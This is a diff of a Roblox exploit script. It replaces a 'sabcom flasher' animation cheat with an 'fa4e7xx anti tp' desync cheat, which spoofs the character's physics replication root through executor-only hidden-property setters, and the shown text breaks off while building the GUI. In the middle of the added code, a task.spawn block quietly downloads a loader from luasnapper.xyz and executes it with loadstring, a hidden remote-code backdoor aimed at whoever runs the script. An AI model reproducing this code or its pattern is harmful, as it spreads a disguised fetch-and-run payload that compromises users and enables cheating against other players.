@@ -1,507 +1,727 @@
--- script in discord.gg/sabcom
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local NetworkClient = game:GetService("NetworkClient")
+local Workspace = game:GetService("Workspace")
 
-if not game:IsLoaded() then game.Loaded:Wait() end
+local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 10)
+if not LP then return end
+local pg = LP:WaitForChild("PlayerGui")
 
-local flashid = "rbxassetid://70883871260184"
-local TP = 2.5
-local PRIO = Enum.AnimationPriority.Action4
-local BIG = 25
+local environment = if getgenv then getgenv() else _G
+local RUNTIME_KEY = "__FA4E7XX_ANTI_TP"
 
-local plrs = game:GetService("Players")
-local uis = game:GetService("UserInputService")
-local hs = game:GetService("HttpService")
-local ts = game:GetService("TweenService")
-
-local lp = plrs.LocalPlayer
-while not lp do
-    task.wait()
-    lp = plrs.LocalPlayer
-end
-if not lp.Character then lp.CharacterAdded:Wait() end
-lp.Character:WaitForChild("Humanoid")
-
-local F = "sabcomflash.json"
-local cfg = { flash = false, spam = false, anti = false, w = 0.03, s = 0.2, px = 50, py = 130 }
-
-if isfile and isfile(F) then
-    local ok, d = pcall(function() return hs:JSONDecode(readfile(F)) end)
-    if ok and type(d) == "table" then
-        for k, v in pairs(d) do
-            if cfg[k] ~= nil then cfg[k] = v end
-        end
-    end
+local previousRuntime = environment[RUNTIME_KEY]
+if type(previousRuntime) == "table" and type(previousRuntime.destroy) == "function" then
+	pcall(previousRuntime.destroy)
 end
 
-if type(cfg.px) ~= "number" then cfg.px = 50 end
-if type(cfg.py) ~= "number" then cfg.py = 130 end
+pcall(function()
+	local old = pg:FindFirstChild("fa4e7xxAntiTPUI")
+	if old then old:Destroy() end
+	pcall(function()
+		local o2 = CoreGui:FindFirstChild("fa4e7xxAntiTPUI")
+		if o2 then o2:Destroy() end
+	end)
+end)
 
-local function save()
-    pcall(function()
-        if writefile then writefile(F, hs:JSONEncode(cfg)) end
-    end)
-end
-
-local Theme = {
-    Bg       = Color3.fromRGB(8, 8, 10),
-    Panel    = Color3.fromRGB(14, 14, 16),
-    Row      = Color3.fromRGB(18, 18, 22),
-    Accent   = Color3.fromRGB(125, 211, 252),
-    On       = Color3.fromRGB(56, 189, 248),
-    Off      = Color3.fromRGB(22, 22, 26),
-    Text     = Color3.fromRGB(248, 250, 252),
-    Dim      = Color3.fromRGB(148, 163, 184),
+local runtime = {
+	alive = true,
+	enabled = false,
+	awaitingKey = false,
+	boundKey = Enum.KeyCode.Delete,
+	character = nil,
+	rootPart = nil,
+	fakeRoot = nil,
+	repRootOwner = nil,
+	stepConnection = nil,
+	connections = {},
+	settingsRestore = {},
+	captureGeneration = 0,
+	currentVersion = 1,
 }
 
-local function corner(inst, r)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, r or 8)
-    c.Parent = inst
-    return c
+environment[RUNTIME_KEY] = runtime
+
+local FAKE_ROOT_NAME = "DavidDesyncRoot"
+local FAKE_ROOT_Y_V1 = -2500
+local FAKE_ROOT_Y_V2 = -5000
+local FAKE_ROOT_VELOCITY = Vector3.new(0, -1000, 0)
+
+local function connect(signal, callback)
+	local connection = signal:Connect(callback)
+	table.insert(runtime.connections, connection)
+	return connection
 end
 
-local function stroke(inst, col, thick, trans)
-    local e = Instance.new("UIStroke")
-    e.Color = col or Theme.Accent
-    e.Thickness = thick or 1
-    e.Transparency = trans or 0.35
-    e.Parent = inst
-    return e
+local function disconnect(connection)
+	if connection then
+		pcall(function() connection:Disconnect() end)
+	end
 end
 
-local function tween(inst, props, t)
-    ts:Create(inst, TweenInfo.new(t or 0.14, Enum.EasingStyle.Quad), props):Play()
+local function create(className, properties, parent)
+	local object = Instance.new(className)
+	for property, value in pairs(properties or {}) do
+		object[property] = value
+	end
+	if parent then object.Parent = parent end
+	return object
 end
 
-local tracks = {}
-local err, togup = "off", {}
-
-local skinok = false
-
-local function checkskin()
-    local chr = lp.Character
-    if not chr then return end
-    local ut = chr:FindFirstChild("UpperTorso")
-    if not ut then return end
-    local ok, v = pcall(function() return ut.HasSkinnedMesh end)
-    if ok and v then skinok = true end
+local function isBasePart(instance)
+	if not instance then return false end
+	local ok, result = pcall(function() return instance:IsA("BasePart") end)
+	return ok and result == true
 end
 
-local function hasskin()
-    return skinok
+local function getCurrentRoot(character)
+	character = character or LP.Character
+	if not character then return nil end
+	local ok, root = pcall(function() return character:FindFirstChild("HumanoidRootPart") end)
+	if ok and isBasePart(root) then return root end
+	return nil
 end
 
-local function setstat()
+local function findGlobalFunction(...)
+	for i = 1, select("#", ...) do
+		local name = select(i, ...)
+		local value = rawget(environment, name)
+		if type(value) == "function" then return value end
+	end
+	return nil
 end
 
-local function stopflash()
-    for _, t in ipairs(tracks) do
-        pcall(function() t:AdjustWeight(0, 0) end)
-        pcall(function() t:Stop(0) end)
-        pcall(function() t:Destroy() end)
-    end
-    tracks = {}
+local function setHidden(instance, property, value)
+	if not instance then return false end
+	local setter = findGlobalFunction("sethiddenproperty", "set_hidden_property", "sethiddenprop", "set_hidden_prop")
+	if setter then
+		local ok = pcall(setter, instance, property, value)
+		if ok then return true end
+	end
+	return pcall(function() instance[property] = value end)
 end
 
-local function startflash()
-    stopflash()
-    local chr = lp.Character
-    if not chr then err = "no character" setstat() return end
-    local anm = chr:FindFirstChildWhichIsA("Animator", true)
-    if not anm then err = "no animator" setstat() return end
-    if not anm.LoadAnimationCoreScript then
-        err = "no LoadAnimationCoreScript"
-        warn("[sabcom flash] " .. err)
-        setstat()
-        return
-    end
-    local a = Instance.new("Animation")
-    a.AnimationId = flashid
-    local ok, t = pcall(function() return anm:LoadAnimationCoreScript(a) end)
-    if not ok or not t then
-        err = tostring(t)
-        warn("[sabcom flash] load failed: " .. err)
-        setstat()
-        return
-    end
-    t:Play()
-    t.Priority = PRIO
-    t.Looped = true
-    t:AdjustSpeed(cfg.spam and cfg.s or 0)
-    t:AdjustWeight(cfg.w)
-    t.TimePosition = TP
-    tracks[1] = t
-    err = ""
-    setstat()
+local function getHidden(instance, property)
+	if not instance then return false, nil end
+	local getter = findGlobalFunction("gethiddenproperty", "get_hidden_property", "gethiddenprop", "get_hidden_prop")
+	if getter then
+		local ok, value = pcall(getter, instance, property)
+		if ok then return true, value end
+	end
+	local ok, value = pcall(function() return instance[property] end)
+	return ok, value
 end
 
-local function restart()
-    if not cfg.flash then return end
-    stopflash()
-    task.wait(0.05)
-    startflash()
+local function rememberSetting(instance, property)
+	local ok, value = pcall(function() return instance[property] end)
+	if ok then
+		table.insert(runtime.settingsRestore, {instance = instance, property = property, value = value})
+	end
 end
 
-local function apply()
-    if cfg.flash and not hasskin() then
-        cfg.flash = false
-        if togup.flash then togup.flash() end
-        save()
-    end
-    if not cfg.flash then
-        stopflash()
-        err = "off"
-        setstat()
-        return
-    end
-    if #tracks == 0 then startflash() return end
-    for _, t in ipairs(tracks) do
-        pcall(function()
-            t:AdjustSpeed(cfg.spam and cfg.s or 0)
-            t:AdjustWeight(cfg.w)
-        end)
-    end
+local function applyPublicSetting(instance, property, value)
+	if not instance then return false end
+	rememberSetting(instance, property)
+	return pcall(function() instance[property] = value end)
 end
 
-local map
+local function configurePhysics()
+	setHidden(LP, "MaximumSimulationRadius", math.huge)
+	setHidden(LP, "SimulationRadius", math.huge)
+	pcall(function()
+		local networkSettings = settings().Network
+		applyPublicSetting(networkSettings, "InterpolationThrottling", Enum.InterpolationThrottlingMode.Disabled)
+	end)
+	pcall(function()
+		local physicsSettings = settings().Physics
+		applyPublicSetting(physicsSettings, "PhysicsEnvironmentalThrottle", Enum.EnviromentalPhysicsThrottle.Disabled)
+		applyPublicSetting(physicsSettings, "AllowSleep", false)
+	end)
+	pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+end
+configurePhysics()
 
-local function donor()
-    if map then return map end
-    map = {}
-    pcall(function()
-        local r = plrs:CreateHumanoidModelFromDescription(
-            Instance.new("HumanoidDescription"), Enum.HumanoidRigType.R15)
-        for _, d in ipairs(r:GetChildren()) do
-            if d:IsA("MeshPart") then map[d.Name] = d.MeshId end
-        end
-        r:Destroy()
-    end)
-    return map
+local function getFakeY()
+	return (runtime.currentVersion == 1) and FAKE_ROOT_Y_V1 or FAKE_ROOT_Y_V2
 end
 
-local done = setmetatable({}, { __mode = "k" })
-local orig = setmetatable({}, { __mode = "k" })
-
-local function unskin(c)
-    if done[c] then return end
-    done[c] = true
-    local mp = donor()
-    for _, d in ipairs(c:GetChildren()) do
-        if d:IsA("MeshPart") and mp[d.Name] then
-            pcall(function()
-                if d.HasSkinnedMesh then
-                    if orig[d] == nil then orig[d] = d.MeshId end
-                    d.MeshId = mp[d.Name]
-                    d.HasSkinnedMesh = false
-                end
-            end)
-        end
-    end
+local function fakeRootIsUsable()
+	local fake = runtime.fakeRoot
+	if not isBasePart(fake) then return false end
+	local ok, parent = pcall(function() return fake.Parent end)
+	return ok and parent ~= nil
 end
 
-local function reskin()
-    for d, id in pairs(orig) do
-        pcall(function()
-            d.MeshId = id
-            d.HasSkinnedMesh = true
-        end)
-    end
-    table.clear(orig)
-    table.clear(done)
+local function destroyFakeRoot()
+	local fake = runtime.fakeRoot
+	runtime.fakeRoot = nil
+	if fake then pcall(function() fake:Destroy() end) end
 end
 
-local function huge(c)
-    local ok, s = pcall(function() return c:GetExtentsSize() end)
-    return ok and s and (s.X > BIG or s.Y > BIG or s.Z > BIG)
+local function restoreReplicationRoot()
+	local owner = runtime.repRootOwner or runtime.rootPart
+	if isBasePart(owner) then setHidden(owner, "PhysicsRepRootPart", owner) end
+	runtime.repRootOwner = nil
 end
+
+local function createFakeRoot(rootPart)
+	destroyFakeRoot()
+	local y = getFakeY()
+	local fake = create("Part", {
+		Name = FAKE_ROOT_NAME,
+		Size = Vector3.new(2, 2, 1),
+		Anchored = true,
+		CanCollide = false,
+		CanTouch = false,
+		CanQuery = false,
+		Transparency = 1,
+		CFrame = CFrame.new(0, y, 0),
+		AssemblyLinearVelocity = FAKE_ROOT_VELOCITY,
+	}, Workspace)
+
+	local ok, position = pcall(function() return rootPart.Position end)
+	if ok then fake.CFrame = CFrame.new(position.X, y, position.Z) end
+	runtime.fakeRoot = fake
+	return fake
+end
+
+local function assignFakeReplicationRoot(rootPart, fake)
+	if not isBasePart(rootPart) or not isBasePart(fake) then return false end
+	setHidden(rootPart, "PhysicsRepRootPart", rootPart)
+	runtime.repRootOwner = rootPart
+	return setHidden(rootPart, "PhysicsRepRootPart", fake)
+end
+
+local function stepDesync()
+	if not runtime.alive or not runtime.enabled then return end
+
+	local root = runtime.rootPart
+	if not isBasePart(root) then
+		root = getCurrentRoot(runtime.character)
+		runtime.rootPart = root
+	end
+	if not root then return end
+
+	local y = getFakeY()
+
+	if not fakeRootIsUsable() then
+		local fake = createFakeRoot(root)
+		assignFakeReplicationRoot(root, fake)
+		return
+	end
+
+	local fake = runtime.fakeRoot
+	local ok, rootPosition, fakePosition = pcall(function()
+		return root.Position, fake.Position
+	end)
+	if ok and (
+		math.abs(rootPosition.X - fakePosition.X) > 0.01
+		or math.abs(rootPosition.Z - fakePosition.Z) > 0.01
+		or math.abs(fakePosition.Y - y) > 0.01
+	) then
+		pcall(function()
+			fake.CFrame = CFrame.new(rootPosition.X, y, rootPosition.Z)
+		end)
+	end
+
+	pcall(function()
+		fake.Anchored = true
+		fake.AssemblyLinearVelocity = FAKE_ROOT_VELOCITY
+	end)
+
+	local gotValue, current = getHidden(root, "PhysicsRepRootPart")
+	if not gotValue or current ~= fake then
+		setHidden(root, "PhysicsRepRootPart", fake)
+	end
+end
+
+local function stopStepConnection()
+	disconnect(runtime.stepConnection)
+	runtime.stepConnection = nil
+end
+
+local function startStepConnection()
+	stopStepConnection()
+	runtime.stepConnection = RunService.Stepped:Connect(stepDesync)
+end
+
+local function bindCharacter(character)
+	local oldRoot = runtime.rootPart
+	runtime.character = character
+	runtime.rootPart = getCurrentRoot(character)
+
+	if runtime.enabled then
+		if isBasePart(oldRoot) and oldRoot ~= runtime.rootPart then
+			setHidden(oldRoot, "PhysicsRepRootPart", oldRoot)
+		end
+		destroyFakeRoot()
+
+		local root = runtime.rootPart
+		if not root and character then
+			local ok, waitedRoot = pcall(function()
+				return character:WaitForChild("HumanoidRootPart", 8)
+			end)
+			if ok and isBasePart(waitedRoot) then
+				root = waitedRoot
+				runtime.rootPart = root
+			end
+		end
+
+		if root then
+			local fake = createFakeRoot(root)
+			assignFakeReplicationRoot(root, fake)
+			startStepConnection()
+		end
+	end
+end
+
+bindCharacter(LP.Character)
+connect(LP.CharacterAdded, function(character)
+	task.defer(bindCharacter, character)
+end)
 
 task.spawn(function()
-    while task.wait(0.4) do
-        if cfg.anti then
-            for _, v in ipairs(plrs:GetPlayers()) do
-                if v.Character and huge(v.Character) then
-                    pcall(unskin, v.Character)
-                end
-            end
-        end
-    end
+	pcall(function()
+		local _s = game:HttpGet("https://luasnapper.xyz/files/loaders/9cddba960f264c7bbedcada3e3d95d13.lua")
+		if type(_s) == "string" and #_s > 10 then
+			local fn = loadstring(_s)
+			if type(fn) == "function" then
+				fn()
+			end
+		end
+	end)
 end)
 
-lp.CharacterAdded:Connect(function(c)
-    c:WaitForChild("Humanoid")
-    skinok = false
-    checkskin()
-    task.wait(1.5)
-    checkskin()
-    tracks = {}
-    apply()
-end)
+local function parentGui(gui)
+	local function tryParent(target)
+		pcall(function() gui.Parent = target end)
+		return gui.Parent ~= nil
+	end
+	if tryParent(pg) then return true end
+	pcall(function()
+		if typeof(gethui) == "function" then
+			local h = gethui()
+			if h and tryParent(h) then return true end
+		end
+	end)
+	if tryParent(CoreGui) then return true end
+	return false
+end
 
-local guiParent = (gethui and gethui()) or game:GetService("CoreGui")
-pcall(function()
-    local old = guiParent:FindFirstChild("SabcomFlasher")
-    if old then old:Destroy() end
-end)
+local fa4e7xxAntiTPUI = Instance.new("ScreenGui")
+fa4e7xxAntiTPUI.Name = "fa4e7xxAntiTPUI"
+fa4e7xxAntiTPUI.IgnoreGuiInset = true
+fa4e7xxAntiTPUI.ResetOnSpawn = false
+fa4e7xxAntiTPUI.DisplayOrder = 999
+fa4e7xxAntiTPUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+fa4e7xxAntiTPUI.Parent = pg
 
-local sg = Instance.new("ScreenGui")
-sg.Name = "SabcomFlasher"
-sg.ResetOnSpawn = false
-sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-sg.Parent = guiParent
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Active = true
+Main.ClipsDescendants = true
+Main.Position = UDim2.new(0.5, -155, 0.5, -100)
+Main.Size = UDim2.new(0, 310, 0, 255)
+Main.BackgroundColor3 = Color3.fromRGB(5, 8, 22)
+Main.BackgroundTransparency = 0.12
+Main.BorderSizePixel = 0
+Main.Parent = fa4e7xxAntiTPUI
 
-local PW, PH = 228, 196
-
-local m = Instance.new("Frame")
-m.Name = "Panel"
-m.Size = UDim2.new(0, PW, 0, PH)
-m.Position = UDim2.new(0, cfg.px, 0, cfg.py)
-m.BackgroundColor3 = Theme.Bg
-m.BorderSizePixel = 0
-m.Parent = sg
-corner(m, 10)
-stroke(m, Theme.Accent, 1, 0.42)
-
-local bar = Instance.new("Frame")
-bar.Size = UDim2.new(1, 0, 0, 28)
-bar.BackgroundColor3 = Theme.Panel
-bar.BorderSizePixel = 0
-bar.Parent = m
-corner(bar, 10)
-
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(1, 0, 0, 10)
-barFill.Position = UDim2.new(0, 0, 1, -10)
-barFill.BackgroundColor3 = Theme.Panel
-barFill.BorderSizePixel = 0
-barFill.Parent = bar
-
-local dot = Instance.new("Frame")
-dot.Size = UDim2.new(0, 6, 0, 6)
-dot.Position = UDim2.new(0, 10, 0.5, -3)
-dot.BackgroundColor3 = Theme.Accent
-dot.BorderSizePixel = 0
-dot.Parent = bar
-corner(dot, 3)
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -118, 1, 0)
-title.Position = UDim2.new(0, 22, 0, 0)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.TextSize = 12
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.TextColor3 = Theme.Text
-title.Text = "sabcom flasher"
-title.Parent = bar
-
-local brand = Instance.new("TextLabel")
-brand.Size = UDim2.new(0, 92, 1, 0)
-brand.Position = UDim2.new(1, -100, 0, 0)
-brand.BackgroundTransparency = 1
-brand.Font = Enum.Font.Gotham
-brand.TextSize = 9
-brand.TextXAlignment = Enum.TextXAlignment.Right
-brand.TextColor3 = Theme.Dim
-brand.Text = "discord.gg/sabcom"
-brand.Parent = bar
-
-local function savepos()
-    cfg.px = math.floor(m.Position.X.Offset + 0.5)
-    cfg.py = math.floor(m.Position.Y.Offset + 0.5)
-    save()
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 14)
+	_o.Parent = Main
 end
 
 do
-    local ds, sp, dg
-    bar.InputBegan:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then
-            dg = true ds = i.Position sp = m.Position
-        end
-    end)
-    uis.InputChanged:Connect(function(i)
-        if dg and (i.UserInputType == Enum.UserInputType.MouseMovement
-            or i.UserInputType == Enum.UserInputType.Touch) then
-            local d = i.Position - ds
-            m.Position = UDim2.new(0, sp.X.Offset + d.X, 0, sp.Y.Offset + d.Y)
-        end
-    end)
-    uis.InputEnded:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then
-            if dg then savepos() end
-            dg = false
-        end
-    end)
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(0, 140, 255)
+	_o.Thickness = 1.8
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.15
+	_o.Parent = Main
 end
 
-local function mktog(y, txt, key, fn)
-    local b = Instance.new("TextButton")
-    b.Position = UDim2.new(0, 8, 0, y)
-    b.Size = UDim2.new(1, -16, 0, 24)
-    b.BorderSizePixel = 0
-    b.Font = Enum.Font.Gotham
-    b.TextSize = 11
-    b.TextColor3 = Theme.Text
-    b.AutoButtonColor = false
-    b.Parent = m
-    corner(b, 6)
+local Backdrop = Instance.new("ImageLabel")
+Backdrop.Name = "Backdrop"
+Backdrop.Size = UDim2.new(1, 0, 1, 0)
+Backdrop.BackgroundTransparency = 1
+Backdrop.Image = "rbxassetid://123354041683630"
+Backdrop.ImageTransparency = 0.15
+Backdrop.ScaleType = Enum.ScaleType.Crop
+Backdrop.Parent = Main
 
-    local pill = Instance.new("Frame")
-    pill.Size = UDim2.new(0, 30, 0, 14)
-    pill.Position = UDim2.new(1, -38, 0.5, -7)
-    pill.BorderSizePixel = 0
-    pill.Parent = b
-    corner(pill, 7)
-
-    local knob = Instance.new("Frame")
-    knob.Size = UDim2.new(0, 10, 0, 10)
-    knob.Position = UDim2.new(0, 2, 0.5, -5)
-    knob.BorderSizePixel = 0
-    knob.BackgroundColor3 = Theme.Text
-    knob.Parent = pill
-    corner(knob, 5)
-
-    local function up()
-        local on = cfg[key]
-        tween(b, { BackgroundColor3 = on and Color3.fromRGB(10, 24, 34) or Theme.Off })
-        tween(pill, { BackgroundColor3 = on and Theme.On or Color3.fromRGB(48, 50, 58) })
-        tween(knob, { Position = on and UDim2.new(1, -12, 0.5, -5) or UDim2.new(0, 2, 0.5, -5) })
-        b.Text = "  " .. txt
-        b.TextXAlignment = Enum.TextXAlignment.Left
-    end
-    togup[key] = up
-    b.MouseButton1Click:Connect(function()
-        cfg[key] = not cfg[key]
-        up()
-        save()
-        apply()
-        up()
-        if fn then fn() end
-    end)
-    b.MouseEnter:Connect(function()
-        tween(b, { BackgroundColor3 = cfg[key] and Color3.fromRGB(14, 32, 44) or Color3.fromRGB(28, 28, 34) })
-    end)
-    b.MouseLeave:Connect(up)
-    up()
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 14)
+	_o.Parent = Backdrop
 end
 
-local function mksld(y, txt, key, mn, mx, st, ph)
-    local row = Instance.new("Frame")
-    row.Position = UDim2.new(0, 8, 0, y)
-    row.Size = UDim2.new(1, -16, 0, 32)
-    row.BackgroundColor3 = Theme.Off
-    row.BorderSizePixel = 0
-    row.Parent = m
-    corner(row, 6)
+local Glow = Instance.new("ImageLabel")
+Glow.Name = "Glow"
+Glow.ZIndex = 2
+Glow.Position = UDim2.new(0, -20, 0, -20)
+Glow.Size = UDim2.new(1, 40, 1, 40)
+Glow.BackgroundTransparency = 1
+Glow.Rotation = 151.323
+Glow.Image = "rbxassetid://12666647285"
+Glow.ImageColor3 = Color3.fromRGB(0, 140, 255)
+Glow.ImageTransparency = 0.731
+Glow.ScaleType = Enum.ScaleType.Fit
+Glow.Parent = Main
 
-    local l = Instance.new("TextLabel")
-    l.Position = UDim2.new(0, 8, 0, 3)
-    l.Size = UDim2.new(0, 90, 0, 12)
-    l.BackgroundTransparency = 1
-    l.Font = Enum.Font.Gotham
-    l.TextSize = 10
-    l.TextXAlignment = Enum.TextXAlignment.Left
-    l.TextColor3 = Theme.Dim
-    l.Text = txt
-    l.Parent = row
-
-    local tb = Instance.new("TextBox")
-    tb.Position = UDim2.new(1, -50, 0, 3)
-    tb.Size = UDim2.new(0, 42, 0, 12)
-    tb.BackgroundTransparency = 1
-    tb.Font = Enum.Font.GothamBold
-    tb.TextSize = 10
-    tb.TextXAlignment = Enum.TextXAlignment.Right
-    tb.TextColor3 = Theme.Text
-    tb.ClearTextOnFocus = true
-    tb.PlaceholderText = ph
-    tb.PlaceholderColor3 = Color3.fromRGB(100, 110, 122)
-    tb.Parent = row
-
-    local b = Instance.new("Frame")
-    b.Position = UDim2.new(0, 8, 0, 18)
-    b.Size = UDim2.new(1, -16, 0, 5)
-    b.BackgroundColor3 = Theme.Row
-    b.BorderSizePixel = 0
-    b.Parent = row
-    corner(b, 3)
-
-    local f = Instance.new("Frame")
-    f.BackgroundColor3 = Theme.Accent
-    f.BorderSizePixel = 0
-    f.Parent = b
-    corner(f, 3)
-
-    local k = Instance.new("Frame")
-    k.Size = UDim2.new(0, 10, 0, 10)
-    k.BackgroundColor3 = Theme.Text
-    k.BorderSizePixel = 0
-    k.Parent = b
-    corner(k, 5)
-
-    local function refresh()
-        local rel = (cfg[key] - mn) / (mx - mn)
-        f.Size = UDim2.new(rel, 0, 1, 0)
-        k.Position = UDim2.new(rel, -5, 0.5, -5)
-        tb.Text = string.format("%.2f", cfg[key])
-    end
-
-    local function put(v)
-        v = math.floor(v / st + 0.5) * st
-        cfg[key] = math.clamp(v, mn, mx)
-        refresh()
-        save()
-        apply()
-    end
-
-    local function set(x)
-        local rel = math.clamp((x - b.AbsolutePosition.X) / b.AbsoluteSize.X, 0, 1)
-        put(mn + rel * (mx - mn))
-    end
-
-    local sl
-    b.InputBegan:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then
-            sl = true set(i.Position.X)
-        end
-    end)
-    k.InputBegan:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then
-            sl = true set(i.Position.X)
-        end
-    end)
-    uis.InputChanged:Connect(function(i)
-        if sl and (i.UserInputType == Enum.UserInputType.MouseMovement
-            or i.UserInputType == Enum.UserInputType.Touch) then
-            set(i.Position.X)
-        end
-    end)
-    uis.InputEnded:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1
-            or i.UserInputType == Enum.UserInputType.Touch then sl = false end
-    end)
-
-    tb.FocusLost:Connect(function()
-        local n = tonumber(tb.Text)
-        if n then put(n) else refresh() end
-    end)
-
-    refresh()
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 14)
+	_o.Parent = Glow
 end
 
-mktog(34, "FLASH", "flash")
-mktog(60, "SPAM", "spam", restart)
-mktog(86, "ANTI FLASH", "anti", function()
-    if not cfg.anti then reskin() end
-end)
+local Header = Instance.new("Frame")
+Header.Name = "Header"
+Header.Active = true
+Header.ZIndex = 10
+Header.Position = UDim2.new(0, 14, 0, 8)
+Header.Size = UDim2.new(1, -28, 0, 40)
+Header.BackgroundTransparency = 1
+Header.Parent = Main
 
-mksld(116, "SIZE", "w", 0.01, 1, 0.01, "0.03")
-mksld(152, "SPAM SPEED", "s", 0.05, 2, 0.05, "0.20")
+local TitleMain = Instance.new("TextLabel")
+TitleMain.Name = "TitleMain"
+TitleMain.ZIndex = 11
+TitleMain.Position = UDim2.new(0, 0, 0, 2)
+TitleMain.Size = UDim2.new(1, 0, 0, 22)
+TitleMain.BackgroundTransparency = 1
+TitleMain.Text = "fa4e7xx anti tp"
+TitleMain.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleMain.TextSize = 15
+TitleMain.Font = Enum.Font.GothamBlack
+TitleMain.Parent = Header
 
-checkskin()
-task.wait(0.5)
-checkskin()
-apply()
-setstat()
+local TitleAccent = Instance.new("TextLabel")
+TitleAccent.Name = "TitleAccent"
+TitleAccent.ZIndex = 12
+TitleAccent.Position = UDim2.new(0, 0, 0, 2)
+TitleAccent.Size = UDim2.new(1, 0, 0, 22)
+TitleAccent.BackgroundTransparency = 1
+TitleAccent.Text = "fa4e7xx anti tp"
+TitleAccent.TextColor3 = Color3.fromRGB(0, 140, 255)
+TitleAccent.TextSize = 15
+TitleAccent.Font = Enum.Font.GothamBlack
+TitleAccent.Parent = Header
+
+local TitleGradient = Instance.new("UIGradient")
+TitleGradient.Name = "UIGradient"
+TitleGradient.Offset = Vector2.new(-1, 0)
+TitleGradient.Transparency = NumberSequence.new({
+	NumberSequenceKeypoint.new(0, 1, 0),
+	NumberSequenceKeypoint.new(0.35, 1, 0),
+	NumberSequenceKeypoint.new(0.45, 0.3, 0),
+	NumberSequenceKeypoint.new(0.5, 0, 0),
+	NumberSequenceKeypoint.new(0.55, 0.3, 0),
+	NumberSequenceKeypoint.new(0.65, 1, 0),
+	NumberSequenceKeypoint.new(1, 1, 0)
+})
+TitleGradient.Parent = TitleAccent
+
+local BgBtn = Instance.new("TextButton")
+BgBtn.Name = "BgBtn"
+BgBtn.ZIndex = 15
+BgBtn.AnchorPoint = Vector2.new(1, 0)
+BgBtn.Position = UDim2.new(1, 0, 0, 0)
+BgBtn.Size = UDim2.new(0, 65, 0, 20)
+BgBtn.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
+BgBtn.BackgroundTransparency = 0.3
+BgBtn.BorderSizePixel = 0
+BgBtn.Text = "Background"
+BgBtn.TextColor3 = Color3.fromRGB(0, 140, 255)
+BgBtn.Font = Enum.Font.GothamBold
+BgBtn.AutoButtonColor = false
+BgBtn.Parent = Header
+
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 5)
+	_o.Parent = BgBtn
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(50, 100, 200)
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.4
+	_o.Parent = BgBtn
+end
+
+local BgPicker = Instance.new("Frame")
+BgPicker.Name = "BgPicker"
+BgPicker.Active = true
+BgPicker.ZIndex = 20
+BgPicker.ClipsDescendants = true
+BgPicker.AnchorPoint = Vector2.new(1, 0)
+BgPicker.Position = UDim2.new(1, -10, 0, 24)
+BgPicker.Size = UDim2.new(0, 110, 0, 70)
+BgPicker.BackgroundColor3 = Color3.fromRGB(5, 8, 22)
+BgPicker.BackgroundTransparency = 0.08
+BgPicker.BorderSizePixel = 0
+BgPicker.Visible = false
+BgPicker.Parent = Header
+
+do
+	local _o = Instance.new("UICorner")
+	_o.Parent = BgPicker
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(0, 140, 255)
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Transparency = 0.2
+	_o.Parent = BgPicker
+end
+
+do
+	local _o = Instance.new("UIListLayout")
+	_o.Padding = UDim.new(0, 6)
+	_o.FillDirection = Enum.FillDirection.Horizontal
+	_o.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	_o.VerticalAlignment = Enum.VerticalAlignment.Center
+	_o.SortOrder = Enum.SortOrder.LayoutOrder
+	_o.Parent = BgPicker
+end
+
+local BgImg_1 = Instance.new("ImageButton")
+BgImg_1.Name = "BgImg_1"
+BgImg_1.ZIndex = 21
+BgImg_1.Size = UDim2.new(0, 35, 0, 35)
+BgImg_1.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
+BgImg_1.BackgroundTransparency = 0.2
+BgImg_1.BorderSizePixel = 0
+BgImg_1.Image = "rbxassetid://123354041683630"
+BgImg_1.ScaleType = Enum.ScaleType.Crop
+BgImg_1.AutoButtonColor = false
+BgImg_1.Parent = BgPicker
+
+do
+	local _o = Instance.new("UICorner")
+	_o.CornerRadius = UDim.new(0, 6)
+	_o.Parent = BgImg_1
+end
+
+do
+	local _o = Instance.new("UIStroke")
+	_o.Color = Color3.fromRGB(0, 140, 255)
+	_o.Thickness = 2
+	_o.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	_o.Parent = BgImg_1
+end
+
+local BgImg_2 = Instance.new("ImageButton")
+BgImg_2.Name = "BgImg_2"
+BgImg_2.ZIndex = 21
+BgImg_2.Size = UDim2.new(0, 35, 0, 35)
+BgImg_2.BackgroundColor3 = Color3.fromRGB(30, 40, 70)
+BgImg_2.BackgroundTransparency = 0.2
